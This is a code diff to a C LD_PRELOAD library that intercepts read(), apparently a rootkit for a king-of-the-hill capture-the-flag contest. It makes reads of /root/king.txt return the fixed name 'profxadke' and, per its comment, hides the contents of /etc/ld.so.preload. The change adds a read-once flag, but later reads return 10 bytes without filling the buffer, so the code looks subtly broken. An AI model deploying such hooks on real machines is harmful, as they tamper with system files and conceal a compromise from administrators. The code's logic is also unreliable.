@@ -19,6 +19,9 @@ static const char *target_file = "/etc/ld.so.preload";
 static const char *hidden_file = "/root/king.txt";
 static int target_pid = 333;
 
+// Is file read?
+static int is_file_read = 0;
+
 // Intercept the read system call
 ssize_t read(int fd, void *buf, size_t count) {
     if (!orig_read) {
@@ -35,17 +38,21 @@ ssize_t read(int fd, void *buf, size_t count) {
 
         // Check if it's the target file for modification
         if (strcmp(real_path, hidden_file) == 0) {
-            const char *message = "profxadke\n";
-            size_t msg_len = strlen(message);
+            if ( !is_file_read ) {
+              const char *message = "profxadke\n";
+              size_t msg_len = strlen(message);
 
-            // Return the message, but respect the requested count
-            if (count > msg_len) {
-                count = msg_len;
+              // Return the message, but respect the requested count
+              if (count > msg_len) {
+                  count = msg_len;
+              }
+
+              // Copy the message to the buffer
+              memcpy(buf, message, count);
+              is_file_read = 1;
+              return 10; // Return the number of bytes written
             }
-
-            // Copy the message to the buffer
-            memcpy(buf, message, count);
-            return 9; // Return the number of bytes written
+            return 10;
         }
 
         // Hide the contents of /etc/ld.so.preload
